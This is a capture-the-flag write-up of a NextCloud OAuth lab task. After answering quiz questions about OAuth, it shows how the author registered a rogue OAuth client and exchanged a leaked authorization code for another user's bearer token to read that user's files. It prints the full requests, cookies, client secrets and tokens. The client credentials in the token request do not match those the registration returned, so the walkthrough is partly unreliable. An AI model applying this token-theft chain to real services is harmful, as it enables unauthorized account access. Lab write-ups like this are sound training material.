
# Task 8  Popiel

## 1. The NextCloud application plays two OAuth roles at once. Which ones?

Answer: `Authorization Server, Resource Server`

We can get that from description:
```
 - Resource Owner, 
 - Resource Server, 
 - Client, 
 - Authorization Server. 
```

## 2. What value of the response_type parameter indicates that an application is starting the authorization code flow?

Answer: `code`

We can find it in linked blog post:

`response_type=code - This tells the authorization server that the application is initiating the authorization code flow`


## 3. During registration, each client receives a unique pair of client_id and client_secret. (Y/N)

Answer: `Y`

It is trivial. Only yes or no :). But also we can find in linked blog post:


```
The application makes a POST request to the service’s token endpoint with the following parameters:

- client_id - The application’s client ID.
- client_secret - The application’s client secret. This ensures that the request to get the access token is made only from the application, and not from a potential attacker that may have intercepted the authorization code.
```

## 4. What endpoint you should use to exchange the OAuth code for a token?

Answer: `/apps/oauth2/api/v1/token`

I made regex and I used in search bar in vs code:

<img src="./task_8.png" width="700"/>

<br>
<br>

## 5. What is the content of the Fern_flower_ritual_shard6.txt file in Popiel's account?

Answer: `Midsummer_Corp{Spr1nkle_wat3r_fr0m_a_s@cr3d_spr1ng_0n_th3_fern}`

At first we must get authorization code from file `authorization_code.txt`:

`Oz5xWmb0pCQEZJp6puQQoSKuM1JK9jczqe3CLKqvl0VuFM7VsWJFqMU6CF0T0ipdOtmy8lkRPIsz0PoWSTbf2gTLx86NZ7YYIY6pZ0Sj8nP6kcQY2uUFRVhxzmAhudrR`

Next we must get file `supportticket_draft.txt`. Twardowski tried to send POST to `/apps/oauth2/clients`:
```
HTTP request
POST /apps/oauth2/clients HTTP/1.1
Host: nextcloud.ctf:8081
Content-Type: application/json
Content-Length: 86
Cookie: ocqpfobax3l0=ea40d3c44aebc7c3d2d060ce0c74f7c4; oc_sessionPassphrase=mzJr4dxugNOXA34YgaivUEgs8P4p%2BEju7qBoC87qZ9S4Cu2lUGAo50U3HiuEw3CAfGgusiTSBSMA8s03rgJY0PcVgGbGJEbyNKV3EdvhxL5lXP83qw8xjBQM6qTj083j; nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true; nc_username=admin; nc_token=RhnpFe88vZTezlB9J0FmEj9S4lrX%2FLyl; nc_session_id=ea40d3c34aebb7c3d2d060ce0c74f7c4

{"name":"alchemy-mixer-ng","redirectUri":"https://alchemy-mixer-ng.ctf/auth/callback"}

```

I tried it in Postman, but I got response:
``` json
{
    "message": "Current user is not logged in"
}
```

So I started to search something about that endpoint.

<img src="./task_8_a.png" width="700"/>

We can get information in `apps/oauth2/lib/Controller/SettingsController.php` that no admin is required to send that request. So cookie `nc_username=admin` is red herring. 
<img src="./task_8_b.png" width="700"/>

So lets be logged in any other account. For example Puck and create app password and copy request token and cookie.

<img src="./task_8_c.png" width="700"/>

We got response:
``` json
{
    "id": 2,
    "name": "alchemy-mixer-ng",
    "redirectUri": "https://alchemy-mixer-ng.ctf/auth/callback",
    "clientId": "jpQ0yUpeKnyjHcujSzv6ckrioDJBZkV3VERm40vRFF0XCMlhGAQWvMZIDBuJ0mg4",
    "clientSecret": "ERoN6gXYe0qSbpNg6OUqxwMoJGFRdMhjpRjp9yMYNe9Al9JECLSxMwNYlObPee44"
}
```
Now we must send request to the `/apps/oauth2/api/v1/token` with json:

```json
{
    "grant_type": "authorization_code",
    "code": "Oz5xWmb0pCQEZJp6puQQoSKuM1JK9jczqe3CLKqvl0VuFM7VsWJFqMU6CF0T0ipdOtmy8lkRPIsz0PoWSTbf2gTLx86NZ7YYIY6pZ0Sj8nP6kcQY2uUFRVhxzmAhudrR",
    "redirect_uri": "https://alchemy-mixer-ng.ctf/auth/callback",
    "client_id": "cvpA0RrYxPz0VMeEQRXejoOJk5IQ2PPOkH803Ywap4NCC06JVfJtmBUgAS6YQmQl",
    "client_secret": "mJSTRqv62M9hX5qFmpmQN1vVmrMCZhKeiYfmRJnJjHCT0H8VeJii5FLSkRGqdjkb"
}
```

It is important to use snake_case. 

Data structure is got from blog post. 

```
- grant_type=authorization_code
- code
- redirect_uri
- client_id
- client_secret
```

code we can get from `authorization_code.txt`

After sending that, we received:

```json
{
    "access_token": "oa5yaxagaZVQDV47OAgltF58ZE1Sq6pwO5Xzrf16ma35DIfzQZA2QHbxXafzgySfAmd2C5Ca",
    "token_type": "Bearer",
    "expires_in": 3600,
    "refresh_token": "Oz5xWmb0pCQEZJp6puQQoSKuM1JK9jczqe3CLKqvl0VuFM7VsWJFqMU6CF0T0ipdOtmy8lkRPIsz0PoWSTbf2gTLx86NZ7YYIY6pZ0Sj8nP6kcQY2uUFRVhxzmAhudrR",
    "user_id": "popiel"
}
```

The most important data is "token_type" and "access_token".

Now we must apply header:

```
Authorization: Bearer oa5yaxagaZVQDV47OAgltF58ZE1Sq6pwO5Xzrf16ma35DIfzQZA2QHbxXafzgySfAmd2C5Ca
```

I used for that application `ModHeader`

<img src="./task_8_d.png" width="700"/>

Next we must logout of Puck' account. After that we are automatically logged in Popiel.

In `Fern_flower_ritual_shard6.txt` we got answer.
